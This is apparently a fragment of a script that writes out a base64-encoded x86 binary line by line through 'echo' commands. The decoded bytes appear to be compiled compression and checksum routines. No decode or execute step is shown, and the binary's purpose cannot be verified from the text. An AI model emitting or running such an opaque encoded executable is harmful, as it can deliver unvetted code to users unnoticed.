echo D7bKi8LB4Qgz0sHoCAPBuR8AAAD38YXSi1QkEA+FnwAAAIvCJA88CHQXi0wkTMdB
echo GPg/QQDHRwRRPwAA6YAIAADB6gSD7gSLyolUJBCD4Q+DwQiDfygAdQOJTyiD+Q93
echo STtPKHdEagC4AQAAANPgagBqAIlHGOiVIgAAi1QkHIPEDItMJEzB6gj30olHHIPi
echo AoHKPT8AAIlBMIlXBDPSiVQkEDP26RcIAACLTCRMx0EYFEBBAMdHBFE/AADpAAgA
echo AItMJEzHQRjgP0EAx0cEUT8AAOnpBwAAg/4QcyqNSQCF7Q+EbwMAAA+2A4vO0+BD
echo A9CJXCQUg8YIiVQkEE2D/hBy3YtMJEyJVxSA+gh0E8dBGPg/QQDHRwRRPwAA6Z8H
echo AAD3wgDgAAB0E8dBGChAQQDHRwRRPwAA6YQHAACLTySFyXQKi8LB6AiD4AGJAfdH
echo FAACAAB0JvZHDAR0IIhUJByNRCQcagLB6ghQiFQkJf93HOiJGQAAg8QMiUccM9LH
echo RwQ2PwAAiVQkEDP26wWD/iBzI4XtD4S8AgAAD7YDi87T4EMD0IlcJBSDxgiJVCQQ
echo TYP+IHLdi0ckhcB0A4lQBPdHFAACAAB0OPZHDAR0MovCiFQkHMHoCIhEJB2LwsHo
echo EIhEJB6NRCQcagTB6hhQiFQkJ/93HOgFGQAAg8QMiUccM9LHRwQ3PwAAiVQkEDP2
echo 6wWD/hBzI4XtD4Q4AgAAD7YDi87T4EMD0IlcJBSDxgiJVCQQTYP+EHLdi08khcl0
echo EQ+2wolBCIvKi0ckwekIiUgM90cUAAIAAHQm9kcMBHQgiFQkHI1EJBxqAsHqCFCI
echo VCQl/3cc6IUYAACDxAyJRxwz0sdHBDg/AACJVCQQM/b3RxQABAAAdHCD/hBzJYv/
echo he0PhK8BAAAPtgOLztPgQwPQiVwkFIPGCIlUJBBNg/4Qct2LRySJV0SFwHQDiVAU
echo 90cUAAIAAHQm9kcMBHQgiFQkHI1EJBxqAsHqCFCIVCQl/3cc6AcYAACDxAyJRxwz
echo yTP2iUwkEOsOi0ckhcB0B8dAEAAAAADHRwQ5PwAA90cUAAQAAA+EjwAAAItPRIlM
echo JDA7zXYGi82JbCQwhcl0cItXJIXSdDuLQhCJRCREhcB0MItCFCtHRItSGIlEJDgD
echo wTvCi0QkOHYEK9DrAovRA0QkRFJTUOjcZP//i0wkPIPEDPdHFAACAAB0FvZHDAR0
echo EFFT/3cc6GUXAACDxAyJRxyLRCQwA9gr6IlcJBQpR0SDf0QAD4WdAAAAx0dEAAAA
echo AMdHBDo/AAD3RxQACAAAD4QOAQAAhe10fjPJ6wONSQAPtgQZQYlEJDCLRySFwHQg
echo i1AchdJ0GYtXRDtQIHMRi0Aci1wkMIgcEP9HRItcJBSLRCQwhcB0BDvNcsT3RxQA
echo AgAAiUwkRHQe9kcMBHQYUVP/dxzoxxYAAItMJFCDxAyJRxyLRCQwA9kr6YlcJBSF
echo wA+EmgAAAIt8JBCLVCRQi0wkTItEJCSLXCQgiUEMi0QkGIlBEItEJBSJaQSLbCQo
echo iQGDeywAiXs8iXNAdSc7aRAPhBcQAACLQwQ9UT8AAA+NCRAAAD1OPwAAfAmD+gQP
echo hPkPAACLxStBEFD/cQxR6EwVAACDxAyFwA+E2w8AAMdDBFI/AAC4/P///15dW1+D
echo xDjDi0ckhcB0B8dAHAAAAADHR0QAAAAAx0cEOz8AAPdHFAAQAAAPhIMAAACF7Q+E
echo Q////zPJD7YEGUGJRCQwi0ckhcB0IItQJIXSdBmLV0Q7UChzEYtAJItcJDCIHBD/
echo R0SLXCQUi0QkMIXAdAQ7zXLE90cUAAIAAIlMJER0HvZHDAR0GFFT/3cc6JEVAACL
echo TCRQg8QMiUcci0QkMAPZK+mJXCQUhcAPhcr+///rDotHJIXAdAfHQCQAAAAAi1Qk
echo EMdHBDw/AAD3RxQAAgAAdFWD/hBzI4XtD4SZ/v//D7YDi87T4EMD0IlcJBSDxgiJ
echo VCQQTYP+EHLd9kcMBHQfD7dHHDvQdBeLTCRMx0EYREBBAMdHBFE/AADpwwIAADPJ
echo M/aJTCQQi08khcl0FotHFMH4CYPgAYlBLItHJMdAMAEAAABqAGoAagDo0hQAAItM
echo JFiDxAyLVCQQiUcciUEwx0cEPz8AAOl2AgAAg/4gcyOF7Q+E//3//w+2A4vO0+BD
echo A9CJXCQUg8YIiVQkEE2D/iBy3YvKi8LB4BCB4QD/AAADyIvCwegIweEIJQD/AAAD
echo wcHqGItMJEwDwjPSiUcciVQkEDP2iUEwx0cEPj8AAIN/EAAPhIcNAABqAGoAagDo
echo TBwAAItMJFiDxAyLVCQQiUcciUEwx0cEPz8AAItEJFCD+AUPhLYNAACD+AYPhK0N
echo AACDfwgAdBmLzsdHBE4/AACD4QfT6ivxiVQkEOmsAQAAg/4DcyOF7Q+EOf3//w+2
echo A4vO0+BDA9CJXCQUg8YIiVQkEE2D/gNy3YvC0eqD4AGJRwiLwoPgA4P4A3cO/ySF
echo 7ABBAMdHBEE/AACLTCRMweoCg+4DiVQkEOlTAQAAg3wkUAbHR1A4N0EAx0dYCQAA
echo AMdHVDg/QQDHR1wFAAAAx0cERz8AAHXDweoCg+4DiVQkEOmw/P//i0wkTMHqAoPu
echo A8dHBEQ/AACJVCQQ6QABAACLTCRMweoCg+4DiVQkEMdBGFhAQQDHRwRRPwAA6d8A
echo AACLzoPhB9PqK/GJVCQQg/4gcyOF7Q+EW/z//w+2A4vO0+BDA9CJXCQUg8YIiVQk
echo EE2D/iBy3YvCi8r30IHh//8AAMHoEDvIdBeLTCRMx0EYbEBBAMdHBFE/AADpgAAA
echo ADPSiU9EM/aJVCQQg3wkUAbHRwRCPwAAD4Q6DAAAi0wkTMdHBEM/AACLR0SJRCQw
echo hcB0azvFdgaLxYlsJDCLTCQYO8F2BovBiUQkMIXAD4TD+///UFP/dCQs6Lhf//+L
echo RCQ8g8QMKUQkGAPYAUQkJCvoKUdEiVwkFItUJBCLTCRMi0cELTQ/AACD+B4Phm72
echo //9eXVu4/v///1+DxDjDx0cEPz8AAOvZg/4OcyqNSQCF7Q+EX/v//w+2A4vO0+BD
echo A9CJXCQUg8YIiVQkEE2D/g5y3YtMJEyLwoPuDoPgH8HqBQUBAQAAiUdki8KD4B/B
echo 6gVAiUdoi8KD4A/B6gSDwASJVCQQgX9kHgEAAIlHYA+H7QAAAIN/aB4Ph+MAAADH
echo R2wAAAAAx0cERT8AAItHbDtHYHNYg/4DcymNmwAAAACF7Q+Ez/r//w+2A4vO0+BD
echo A9CJXCQUg8YIiVQkEE2D/gNy3YtHbIvKg+EHweoDg+4DiVQkEA+3BEW4P0EAZolM
echo R3T/R2yLR2w7R2ByqIN/bBNzG4tHbDPJD7cERbg/QQBmiUxHdP9HbIN/bBNy5Y2H
echo NAUAAMdHWAcAAACNT3CJR1CJAY1XWI2H9AIAAFBSUWoTjUd0UGoA6CQcAACDxBiJ
echo RCQshcB0LotMJEyLVCQQx0EYsEBBAMdHBFE/AADpf/7//8dBGIxAQQDHRwRRPwAA
echo 6Wz+///HR2wAAAAAx0cERj8AAItHaItPbANHZIlMJDA7yA+DNwIAAIt8JBCNZCQA
echo i0QkQLoBAAAAiwiLRCQg0+JKI9eLQFCLBJCLyMHpCA+2yYlEJDg7znZOjZsAAAAA
echo he0PhKP5//8PtgOLztPgugEAAAAD+EOLRCRAg8YITYl8JBCJXCQUiwiLRCQg0+JK
echo I9eLQFCLBJCLyMHpCA+2yYlEJDg7zne4i9DB6hBmg/oQcyPB6AgPtsiLRCQwK/HT
echo 74tMJCCJfCQQZolUQXT/QWzpcAEAAHV3i8jB6QgPtsmDwQKJTCREO/FzKesDjUkA
echo he0PhBP5//8PthOLztPiQwP6iVwkFIPGCIl8JBBNO3QkRHLci1QkEIt8JCAPtsyL
echo RCQwK/HT6olUJBCFwA+EXgEAAA+3REdyi8qD4QPB6gKDwQOJRCQ4g+4C6b0AAABm
echo g3wkOhGLVCQQD7bEdVKNeAOJRCREO/dzLY2kJAAAAACF7Q+Ej/j//w+2A4vO0+BD
echo A9CJXCQUg8YIiVQkEE0793Lei0QkRIvIuP3////T6ovKweoDg+EHg8EDK0QkROtO
echo jXgHiUQkRDv3cyvrA41JAIXtD4Q/+P//D7YDi87T4EMD0IlcJBSDxgiJVCQQTTv3
echo ct6LRCREi8i4+f///9Pqi8rB6geD4X+DwQsrRCREi3wkIAPwx0QkOAAAAACLR2gD
echo R2SJTCQ0A0wkMIlUJBA7yHdvi0wkNIXJdBSLVCQ4i/+LR2xmiVRHdP9HbEl18otM
echo JCCLfCQQi0Foi1FsA0FkiVQkMDvQD4LV/f//i3wkIIF/BFE/AAAPhP37//9mg790
echo AgAAAHUyi0wkTItUJBDHQRjoQEEAx0cEUT8AAOng+///i0wkTMdBGMxAQQDHRwRR
echo PwAA6cn7//+NhzQFAADHR1gJAAAAjU9wiUdQiQGNV1iNh/QCAABQUlH/d2SNR3RQ
echo agHoGRkAAIPEGIlEJCyFwHQbi0wkTItUJBDHQRgQQUEAx0cEUT8AAOl0+///i0dw
echo jU9wiUdUjVdcjYf0AgAAxwIGAAAAUItHZFJR/3dog8A6jQRHUGoC6MQYAACL0IPE
echo GIlUJCyF0nQbi0wkTItUJBDHQRgsQUEAx0cEUT8AAOkd+///i1QkUMdHBEc/AACD
echo +gYPhNcGAACLVCQQi0wkTMdHBEg/AACD/QZycYF8JBgCAQAAcmeLRCQk/3QkKIlB
echo DItEJByJQRCJGYlpBFGJVzyJd0DopxwAAItMJFSDxAiBfwQ/PwAAi1c8i3dAi0EM
echo ixmLaQSJRCQki0EQiUQkGIlcJBSJVCQQD4WT+v//x4fIGwAA/////+mE+v//i0dQ
echo i09YiUQkRLgBAAAA0+CLT1BII8LHh8gbAAAAAAAAiwSBi8jB6QgPtsk7znZGjUkA
echo he0PhN/1//8PtgOLztPgQ4tPWAPQi0dQg8YIiVQkEE26AQAAAIlcJBTT4kojVCQQ
echo iwSQi8iLVCQQwekID7bJO853vYTAD4TFAAAAqPAPhb0AAACLyLsBAAAAwekIi9AP
echo tvmJTCQ0D7bIA8/B6BDT44vPS4lUJDgjXCQQ0+uLTCREA9iLBJmLyMHpCA+2+YtM
echo JDQPtskD+Tv+dlzrA41JAIXtD4Q/9f//i1wkFIvOvwEAAACDxghND7YDQ9PgAUQk
echo EA+3RCQ6iVwkFA+23g+2ygPL0+eLy08jfCQQ0+8D+ItEJCCLQFCLBLiLyMHpCA+2
echo yQPLO853qYt8JCCLXCQUD7bOi1QkENPqK/GJj8gbAACLyMHpCA+2yQGPyBsAACvx
echo 0+qLyMHpEIlUJBCJT0SEwHUMx0cETT8AAOkP+f//qCB0FseHyBsAAP/////HRwQ/
echo PwAA6fX4//+oQHQXi0wkTMdBGERBQQDHRwRRPwAA6d74//8PtsCD4A/HRwRJPwAA
echo iUdMi09Mhcl0RjvxcyeL/4XtD4RP9P//D7YDi87T4EOLT0wD0IPGCIlUJBBNiVwk
echo FDvxctu4AQAAACvx0+BII8LT6gFHRAGPyBsAAIlUJBCLR0SJh8wbAADHRwRKPwAA
echo i0dUi09ciUQkRLgBAAAA0+CLT1RII8KLBIGLyMHpCA+2yTvOdkOF7Q+E2fP//w+2
echo A4vO0+BDi09cA9CLR1SDxgiJVCQQTboBAAAAiVwkFNPiSiNUJBCLBJCLyItUJBDB
echo 6QgPtsk7zne9qPAPhbsAAACLyLsBAAAAwekIi9APtvmJTCQ0D7bIA8/B6BDT44vP
echo S4lUJDgjXCQQ0+uLTCREA9iLBJmLyMHpCA+2+YtMJDQPtskD+Tv+dl6NpCQAAAAA
echo he0PhD/z//+LXCQUi86/AQAAAIPGCE0PtgND0+ABRCQQD7dEJDqJXCQUD7beD7bK
echo A8vT54vLTyN8JBDT7wP4i0QkIItAVIsEuIvIwekID7bJA8s7znepi3wkIA+2zotU
echo JBAr8dPqAY/IGwAAi1wkFIvIwekID7bJAY/IGwAAK/HT6olUJBCoQHQXi0wkTMdB
echo GGBBQQDHRwRRPwAA6RD3//+LyMdHBEs/AADB6RAPtsCD4A+JT0iJR0yLT0yFyXRE
echo O/FzJYXtD4R78v//D7YDi87T4EOLT0wD0IPGCIlUJBBNiVwkFDvxctu4AQAAACvx
echo 0+BII8LT6gFHSAGPyBsAAIlUJBDHRwRMPwAAi0wkGIXJD4Qw8v//i0QkKCvBi09I
echo O8h2TyvIO08wdiCDv8QbAAAAdBeLTCRMx0EYeEFBAMdHBFE/AADpZvb//4tHNDvI
echo dgwryItHOANHLCvB6wiLRzgrwQNHNIlEJDiLR0Q7yHYR6w2LRCQkK8GJRCQ4i0dE
echo i8g7TCQYdgSLTCQYi1wkOCvBKUwkGIlHRIt8JCQr35CKBDuIB0dJdfeLXCQUiXwk
echo JIt8JCA5T0QPhe/1///HRwRIPwAA6eP1//+DfCQYAA+EcvH//4tcJCSKR0T/RCQk
echo /0wkGIgDi1wkFMdHBEg/AADpu/X//4N/DAAPhNUAAACD/iBzJ4XtD4Q68f//D7YD
echo i87T4EMD0IlcJBSDxgiJVCQQTYP+IHLdi0wkTItEJCgrRCQYAUEUAUcg9kcMBIlE
echo JCh0NIXAdDBQi0QkKCtEJCyDfxQAUP93HHQH6JAHAADrBeiZDwAAi0wkWIPEDItU
echo JBCJRxyJQTD2RwwEi0QkGIlEJCh0R4N/FACLynUjgeEA/wAAi8LB4BADyIvCwegI
echo JQD/AADB4QgDyIvCwegYA8g7Txx0F4tMJEzHQRiYQUEAx0cEUT8AAOnk9P//M9Iz
echo 9olUJBDHRwRPPwAAg38MAA+EeAAAAIN/FAB0coP+IHMjhe0PhE7w//8PtgOLztPg
echo QwPQiVwkFIPGCIlUJBBNg/4gct07VyB0PYtMJEzHQRiwQUEAx0cEUT8AAOmB9P//
echo i0QkJIlBDItEJBiJQRC4AgAAAIkZiWkEiXdAXl1biVc8X4PEOMMzyTP2iUwkEMdH
echo BFA/AADHRCQsAQAAAOnV7///x0QkLP3////pyO///4t8JBDpx+///zP/6bzv//+L
echo fCQQi9Dpte///4tMJEyLRCQ8K0EEK2kQAUEIAWkUAWsg9kMMBIlEJDx0PIXtdDiL
echo QQxVK8WDexQAUP9zHHQU6BwGAACLfCRYg8QMiUMciUcw6xjoGA4AAIt8JFiDxAyJ
echo QxyJRzDrBIt8JEyLUwSB+kc/AAB0DIH6Qj8AAHQEM/brBb4AAQAAi0sI99kbyTPA
echo g+FAgfo/PwAAD5XASCWAAAAAA8gDS0ADzoN8JDwAiU8sdQSF7XQHg3wkUAR1GYtE
echo JCyFwA+Fce///15dW7j7////X4PEOMOLRCQsXl1bX4PEOMO4/v///1+DxDjDjUkA
echo J+pAALjrQABu7EAA8uxAAHDtQAD+7UAAqO5AAN/vQACI8EAAK/FAAI/xQAC88UAA
echo 0vFAAMLyQABC80AASfNAAMjzQABN9EAAQ/VAAKD4QACn+EAA0/pAADD7QACp/EAA
echo +/xAALr9QADm/UAAzP5AAFX/QABi/0AAtu9AADTyQABO8kAAh/JAAKHyQADMzMzM
echo Vot0JAiF9nRUg34gAHROi04khcl0R4tGHIXAdEA5MHU8i1AEgfo0PwAAfDGB+lM/
echo AAB/KYtAOIXAdAlQ/3Yo/9GDxAj/dhyLRiT/dij/0IPECMdGHAAAAAAzwF7DuP7/
echo //9ew8zMzMzMzMzMzMzMzItEJAyFwA+EqQAAAIA4MQ+FoAAAAIN8JBA4D4WVAAAA
echo Vot0JAiF9nUFjUb+XsODfiAAx0YYAAAAAHUOx0YgoBlBAMdGKAAAAACDfiQAdQfH
echo RiTAGUEAi0YgV2jQGwAAagH/dij/0Iv4g8QMhf91Bo1H/F9ew1P/dCQUiX4cVok3
echo x0c4AAAAAMdHBDQ/AADorQAAAIvYg8QIhdt0E4tOJFf/dij/0YPECMdGHAAAAACL
echo w1tfXsO4+v///8PMzMzMzP90JAz/dCQMag//dCQQ6C3///+DxBDDzMzMzMzMzMzM
echo i0QkBIXAdEiDeCAAdEKDeCQAdDyLSByFyXQ1OQF1MYtRBIH6ND8AAHwmgfpTPwAA
echo fx7HQSwAAAAAx0EwAAAAAMdBNAAAAACJRCQE6cAAAAC4/v///8PMzMzMzMzMzMzM
echo U1eLfCQMhf8PhJkAAACDfyAAD4SPAAAAi08khckPhIQAAACLXxyF23R9OTt1eYtD
echo BD00PwAAfG89Uz8AAH9oVVaLdCQYhfZ5BjPt997rEIvuwf0Eg8UFg/4wfQOD5g+F
echo 9nQUg/4IfAWD/g9+Cl5dX7j+////W8OLQziFwHQVOXModBBQ/3co/9GDxAjHQzgA
echo AAAAV4lrDIlzKOgB////g8QEXl1fW8NfuP7///9bw8yLRCQEhcAPhMIAAACDeCAA
echo D4S4AAAAg3gkAA+ErgAAAItIHIXJD4SjAAAAOQEPhZsAAACLUQSB+jQ/AAAPjIwA
echo AACB+lM/AAAPj4AAAADHQSAAAAAAx0AUAAAAAMdACAAAAADHQBgAAAAAi1EMhdJ0
echo BoPiAYlQMI2BNAUAAMdBBDQ/AACJQXCJQVSJQVAzwMdBCAAAAADHQRAAAAAAx0EY
echo AIAAAMdBJAAAAADHQTwAAAAAx0FAAAAAAMeBxBsAAAEAAADHgcgbAAD/////w7j+
echo ////w8zMzMzMzMzMzMzMzItEJASFwHQrg3ggAHQlg3gkAHQfi0gchcl0GDkBdRSL
echo QQQ9ND8AAHwKPVM/AAB/AzPAw7gBAAAAw8zMzMzMzMxVi2wkCFZXi3wkGDP2i0UA
echo hf90SFOD+ARzOItMJBiD+AIb0oHiAf///4ocDoHC/wAAAA+2yzvKdQNA6xGE23QE
echo M8DrCbkEAAAAK8iLwUY793LDW4lFAIvGX15dw4lFAIvGX15dw8zMzMzMzMzMzMzM
echo i1QkBFZXvwEAAACLchyDfjgAdSCLTiiLx9PgV1D/ciiLQiD/0IPEDIlGOIXAdQWL
echo x19ew4N+LAB1FotOKNPniX4sx0Y0AAAAAMdGMAAAAACLfixTi1wkGDvfciaLRCQU
echo VyvHUP92OOjbTf//i0Ysg8QMiUYwM8DHRjQAAAAAW19ewyt+NDv7dgKL+1WLbCQY
echo i8Urw1dQi0Y4A0Y0UOilTf//g8QMK990H1Mr61X/djjokk3//4tGLIPEDIleNIlG
echo MDPAXVtfXsMBfjSLTiw5TjR1B8dGNAAAAACLRjA7wXMFA8eJRjBdW18zwF7DzMzM
echo i0QkCIXAdQHDiUQkCOneBAAAzMzMzMzMzMzMzMzMzMyLVCQEi8IlAP8AAIvKweEQ
echo A8GLysHgCMHpCIHhAP8AAMHqGFOLXCQMA8FXi3wkFAPC99CF/3Qd9sMDdBgPtguL
echo 0MHqGEMz0cHgCDMElchRQQBPdeNWg/8gD4IGAgAAVYvvwe0FMwOL0IvIweoQwekI
echo geL/AAAAgeH/AAAAixSVyFlBADMUjchVQQCLyA+2wMHpGDMUjchdQQAzFIXIUUEA
echo M1MEg8MIi8qJXCQYi3QkGIvCwegIJf8AAADB6RCB4f8AAACLHI3IWUEAMxyFyFVB
echo AIvCwegYMxyFyF1BAA+2wjMchchRQQAzHovLi8PB6Agl/wAAAMHpEIHh/wAAAIsU
echo jchZQQAzFIXIVUEAi8PB6BgzFIXIXUEAD7bDMxSFyFFBADNWBIvKi8LB6Agl/wAA
echo AMHpEIHh/wAAAIscjchZQQAzHIXIVUEAi8LB6BgzHIXIXUEAD7bCMxyFyFFBADNe
echo CIvLi8PB6RDB6AiB4f8AAAAl/wAAAIsUjchZQQAzFIXIVUEAi8PB6BgzFIXIXUEA
echo D7bDMxSFyFFBADNWDIvKi8LB6RCB4f8AAADB6Agl/wAAAIscjchZQQAzHIXIVUEA
echo g+8gi8LB6BgzHIXIXUEAD7bCMxyFyFFBADNeEIPGFIvLiXQkGMHpEIvDwegIgeH/
echo AAAAJf8AAACLFI3IWUEAMxSFyFVBAIvDwegYMxSFyF1BAA+2w4veMxSFyFFBADMT
echo g8MEi8KLysHoECX/AAAAwekIgeH/AAAAiwSFyFlBADMEjchVQQCLysHpGDMEjchd
echo QQAPtsozBI3IUUEATQ+FAf7//12D/wRyTov3we4Ci/8zA4PvBIvQi8jB6hCDwwSB
echo 4v8AAADB6QiB4f8AAACLFJXIWUEAMxSNyFVBAIvIwekYD7bAMxSNyF1BADMUhchR
echo QQCLwk51uV6F/3QejWQkAA+2C41bAYvQweAIweoYM9EzBJXIUUEAT3Xm99CL0IvI
echo weEQgeIA/wAAA9GLyMHpCMHiCIHhAP8AAAPRwegYXwPCW8PMzMzMzMzMzMzMzMzM
echo gewAAQAAVYusJBABAABXi7wkGAEAAIX/fxZ8BIXtdRCLhCQMAQAAX12BxAABAADD
echo uQEAAADHRCQIIIO47YvBkIlMhAhAA8mD+CB89FNWM/aLRDQQjUwkEDPShcB0D4v/
echo qAF0AjMRg8EE0eh184mUNJAAAACDxgSB/oAAAAB80TP26w2NpCQAAAAAjZsAAAAA
echo i4Q0kAAAAI2MJJAAAAAz0oXAdA2oAXQCMxGDwQTR6HXziVQ0EIPGBIH+gAAAAHzQ
echo i5wkFAEAAOsHjaQkAAAAADP2i0Q0EI1MJBAz0oXAdA2oAXQCMxGDwQTR6HXziZQ0
echo kAAAAIPGBIH+gAAAAHzTi8WD4AGDyAB0HTPJjYQkkAAAAIXbdA72wwF0AjMIg8AE
echo 0et18ovZD6z9AdH/i8ULx3RyM/brCo2kJAAAAACNSQCLhDSQAAAAjYwkkAAAADPS
echo hcB0DagBdAIzEYPBBNHodfOJVDQQg8YEgf6AAAAAfNCLxYPgAYPIAHQaM8mNRCQQ
echo hdt0DvbDAXQCMwiDwATR63Xyi9kPrP0B0f+LzQvPD4Us////M5wkGAEAAF6Lw1tf
echo XYHEAAEAAMPMzMzMzMzMzItEJARTi1wkDPfQV4t8JBSF/3Qe9sMDdBkPtgtDM8jB
echo 6AiB4f8AAAAzBI3IQUEAT3XiVoP/IA+CBgIAAFWL78HtBTMDi9CLyMHqEMHpCIHi
echo /wAAAIHh/wAAAIsUlchFQQAzFI3ISUEAi8gPtsDB6RgzFI3IQUEAMxSFyE1BADNT
echo BIPDCIvKiVwkGIt0JBiLwsHoCCX/AAAAwekQgeH/AAAAixyNyEVBADMchchJQQCL
echo wsHoGDMchchBQQAPtsIzHIXITUEAMx6Ly4vDwegIJf8AAADB6RCB4f8AAACLFI3I
echo RUEAMxSFyElBAIvDwegYMxSFyEFBAA+2wzMUhchNQQAzVgSLyovCwegIJf8AAADB
echo 6RCB4f8AAACLHI3IRUEAMxyFyElBAIvCwegYMxyFyEFBAA+2wjMchchNQQAzXgiL
echo y4vDwekQwegIgeH/AAAAJf8AAACLFI3IRUEAMxSFyElBAIvDwegYMxSFyEFBAA+2
echo wzMUhchNQQAzVgyLyovCwekQgeH/AAAAwegIJf8AAACLHI3IRUEAMxyFyElBAIPv
echo IIvCwegYMxyFyEFBAA+2wjMchchNQQAzXhCDxhSLy4l0JBjB6RCLw8HoCIHh/wAA
echo ACX/AAAAixSNyEVBADMUhchJQQCLw8HoGDMUhchBQQAPtsOL3jMUhchNQQAzE4PD
echo BIvCi8rB6BAl/wAAAMHpCIHh/wAAAIsEhchFQQAzBI3ISUEAi8rB6RgzBI3IQUEA
echo D7bKMwSNyE1BAE0PhQH+//9dg/8EclCL98HuAo1kJAAzA4PvBIvQi8jB6hCDwwSB
echo 4v8AAADB6QiB4f8AAACLFJXIRUEAMxSNyElBAIvIwekYD7bAMxSNyEFBADMUhchN
echo QQCLwk51uV6F/3QfjWQkAA+2C41bATPIwegIgeH/AAAAMwSNyEFBAE915V/30FvD
echo U1WLbCQQi91Wi3QkECveV78gAAAAiwQzM9KLzYXAdA2oAXQCMxGDwQTR6HXziRaD
echo xgRPdeBfXl1bw8zMzMzMzItMJAgzwIXJdBSLVCQEi//2wQF0AjMCg8IE0el18sPM
echo 6bsAAADMzMzMzMzMzMzMzItEJBBVi2wkEIXAfwt8BIXtcwWDyP9dw1NWV2oAaPH/
echo AABQVeiHQ///i1wkFIt0JBhpwPH/AAAPt8uL+cHrECvoD7fGBfD/AAAPr/0DyMHu
echo ELhxgAeA9+eBx/H/AADB6g9pwvH/AAAr2I0EHivFA8dfXluB+fH/AAByFIHp8f8A
echo AIH58f8AAHIGgenx/wAAPeL/AQByBS3i/wEAPfH/AAByBS3x/wAAweAQC8Fdw8zM
echo i0wkBFOLXCQQVovxgeH//wAAwe4Qg/sBdTGLRCQQD7YAA8iB+fH/AAByBoHp8f8A
echo AAPxgf7x/wAAcgaB7vH/AADB5hAL8YvGXlvDV4t8JBSF/3UHjUcBX15bw4P7EHM7
echo hdt0DQ+2B41/AQPIA/FLdfOB+fH/AAByBoHp8f8AALhxgAeA9+ZfweoPi8LB4AQr
echo wgPGweAQXgvBW8OB+7AVAAAPgt4AAAC4r6luXvfjVYvqwe0L6wqNpCQAAAAAjUkA
echo geuwFQAAulsBAADrA41JAA+2BwPID7ZHAQPxA8gPtkcCA/EDyA+2RwMD8QPID7ZH
echo BAPxA8gPtkcFA/EDyA+2RwYD8QPID7ZHBwPxA8gPtkcIA/EDyA+2RwkD8QPID7ZH
echo CgPxA8gPtkcLA/EDyA+2RwwD8QPID7ZHDQPxA8gPtkcOA/EDyA+2Rw8D8YPHEAPI
echo A/FKD4V3////uHGAB4D34cHqD2nCDwD//wPIuHGAB4D35sHqD2nCDwD//wPwTQ+F
echo PP///12F2w+E1AAAAIP7EA+ClgAAAIvTweoE6wONSQAPtgeD6xADyA+2RwED8QPI
echo D7ZHAgPxA8gPtkcDA/EDyA+2RwQD8QPID7ZHBQPxA8gPtkcGA/EDyA+2RwcD8QPI
echo D7ZHCAPxA8gPtkcJA/EDyA+2RwoD8QPID7ZHCwPxA8gPtkcMA/EDyA+2Rw0D8QPI
echo D7ZHDgPxA8gPtkcPA/GDxxADyAPxSg+FdP///4XbdA0PtgeNfwEDyAPxS3XzuHGA
echo B4D34bhxgAeAweoPadIPAP//A8r35sHqD2nCDwD//wPwweYQC/Ffi8ZeW8PMzMzM
echo g+x8M8AzyVNVi6wkjAAAAFaLtCSUAAAAiUQkSIlEJEyJRCRQiUQkVIlEJFiJRCRc
echo iUQkYIlEJGRXhfZ0Eo1JAA+3RE0AQWb/RERMO85y8YucJKAAAAC/DwAAAIsDiUQk
echo GGaDfHxMAHUGT4P/AXPyO8d2BovHiUQkGIX/dTGLlCScAAAAx0QkEEABAACLRCQQ
echo X4sKXl2JAYMCBIsKiQGDAgQzwMcDAQAAAFuDxHzDuwEAAACJXCQ0O/t2FusDjUkA
echo ZoN8XEwAdQVDO99y84lcJDQ7w3MEiVwkGLoBAAAAi8oPt0RMTAPSK9APiGQDAABB
echo g/kPduuF0n4Xg7wkkAAAAAAPhEwDAACD/wEPhUMDAAAzwLkCAAAAZolEJG6NZCQA
echo ZotEDGxmA0QMTGaJRAxug8ECg/kecukzyYX2dCmLlCSkAAAAD7dETQBmhcB0Ew+3
echo RERsZokMQg+3RE0AZv9ERGxBO85y3ou0JJAAAACLxoPoAHQ2SHQYM8DHRCQseGJB
echo AMdEJCi4YkEAiUQkJOsyuAEBAADHRCQs+GFBAMdEJCg4YkEAiUQkJOsXi4QkpAAA
echo AIlEJCiJRCQsx0QkJBQAAACLjCScAAAAvQEAAAAz0sdEJCAAAAAAiVQkFMdEJDz/
echo ////iwGLTCQY0+WJRCQci8WJbCQwiUQkOI1I/4lMJECD/gF1CT1UAwAAdw7rJoP+
echo AnUhPVACAAB2Gl9eXbgBAAAAW4PEfMPrB42kJAAAAACLbCQwi3QkJIrDKsKIRCQR
echo i4QkpAAAAA+3EIvKjUEBO8ZzDMZEJBAAZolUJBLrJzvOcheLRCQoK86KBEiIRCQQ
echo i0QkLGaLBEjrB8ZEJBBgM8BmiUQkEotEJCCLyytMJBS+AQAAANPmi9WLTCQU0+iL
echo TCQcA8KJVCREjSy1AAAAAI0MgYtEJBArzYkBK9Z1+I1L/7oBAAAA0+KLTCQghdF0
echo BtHqhdF1+oXSdA+NQv8jwQPCi+iJRCQg6wYz7YlsJCCLhCSkAAAAuf//AACDwAJm
echo AUxcTImEJKQAAAB1GjvfD4T0AAAAD7cAi4wklAAAAA+3HEGJXCQ0i0QkGItUJBQ7
echo 2A+G+f7//4t0JEAj9YtsJDCJdCRIO3QkPA+E5f7//4XSdQaL0IlUJBSLRCREK9qL
echo TCQcA9ONDIG4AQAAAIlMJByLy9PgO9dzH410JEyNNFYPtw4rwYXAfgtCQ4PGAgPA
echo O9dy7It0JEiLRCQ4i8u9AQAAANPli4wkkAAAAAPFiWwkMIlEJDiD+QF1Bz1UAwAA
echo 6wqD+QJ1Cz1QAgAAD4dI/v//i5QknAAAAItMJBiJdCQ8iwKIHLCLAotcJDSITLAB
echo iwqLRCQci1QkFCvBwfgCZolEsQLpK/7//4XtdB8qXCQUM8CLTCQcxkQkEECIXCQR
echo ZolEJBKLRCQQiQSpi4wknAAAAItEJDjB4AJfAQGLjCScAAAAi0QkFF5diQEzwFuD
echo xHzDX15dg8j/W4PEfMPMzIPsOFNVVleLTCRMi1kci0EEixGDwPuLcQwDwolEJDiL
echo QRCLyCtMJFAF//7//wPGi2tAiUQkFAPOi0MsiUQkMItDMIlEJESLQzSJRCQ0i0M4
echo iUQkIItDUIlEJCiLQ1SJRCQsuAEAAACJRCQYiUwkQItLWNNkJBiLS1z/TCQY0+BI
echo iVwkHIt7PIlUJBCJRCQ8kIP9D3MeD7YCi83T4I1NCAP4D7ZCAdPgg8ICA/iJVCQQ
echo g8UQi0QkGItMJCgjx4scgYvDwegID7bI0+8r6Q+204TbdDn2whB1P/bCQA+FlgIA
echo AIvKwesQuAEAAADT4ItMJChII8cDw4scgYvDwegID7bI0+8r6Q+204TbdcfB6xCI
